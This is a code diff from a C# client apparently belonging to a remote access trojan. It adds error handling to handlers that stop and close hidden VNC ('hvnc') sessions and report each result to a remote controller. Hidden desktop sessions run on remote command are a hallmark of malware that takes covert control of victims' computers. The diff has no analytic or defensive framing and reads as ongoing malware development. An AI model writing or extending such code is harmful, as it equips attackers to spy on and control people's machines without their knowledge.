@@ -3076,43 +3076,74 @@ namespace winClient48
                         {
                             string szName = cmd[3];
 
-                            var hvnc = fnGetHVNC(szName);
-                            if (hvnc == null)
-                                return;
-
-                            hvnc.m_bRunning = false;
-
-                            v.fnSendCommand(new string[]
+                            try
                             {
-                                "hvnc",
-                                "window",
-                                "stop",
-                                szName,
-                                "1",
-                            });
+                                var hvnc = fnGetHVNC(szName);
+                                if (hvnc == null)
+                                    return;
+
+                                hvnc.m_bRunning = false;
+
+                                v.fnSendCommand(new string[]
+                                {
+                                    "hvnc",
+                                    "window",
+                                    "stop",
+                                    szName,
+                                    "1",
+                                });
+                            }
+                            catch (Exception ex)
+                            {
+                                v.fnSendCommand(new string[]
+                                {
+                                    "hvnc",
+                                    "window",
+                                    "stop",
+                                    szName,
+                                    "0",
+                                    ex.Message,
+                                });
+                            }
                         }
                         else if (cmd[2] == "close")
                         {
                             string szName = cmd[3];
                             int nDelay = int.Parse(cmd[4]);
 
-                            var hvnc = fnGetHVNC(szName);
-                            if (hvnc == null)
-                                return;
-
-                            hvnc.m_bRunning = false;
-                            Thread.Sleep(nDelay * 2);
-
-                            hvnc.Dispose();
-                            m_lsHVNC.Remove(hvnc);
-
-                            v.fnSendCommand(new string[]
+                            try
                             {
-                                "hvnc",
-                                "window",
-                                "close",
-                                "1",
-                            });
+                                var hvnc = fnGetHVNC(szName);
+                                if (hvnc == null)
+                                    throw new Exception("Cannot find HVNC session: " + szName);
+
+                                hvnc.m_bRunning = false;
+                                Thread.Sleep(nDelay * 2);
+
+                                hvnc.Dispose();
+                                m_lsHVNC.Remove(hvnc);
+
+                                v.fnSendCommand(new string[]
+                                {
+                                    "hvnc",
+                                    "window",
+                                    "close",
+                                    szName,
+                                    "1",
+                                });
+                            }
+                            catch (Exception ex)
+                            {
+                                v.fnSendCommand(new string[]
+                                {
+                                    "hvnc",
+                                    "window",
+                                    "close",
+                                    szName,
+                                    "0",
+                                    ex.Message,
+                                });
+                            }
                         }
                     }
                     else if (cmd[1] == "mouse")
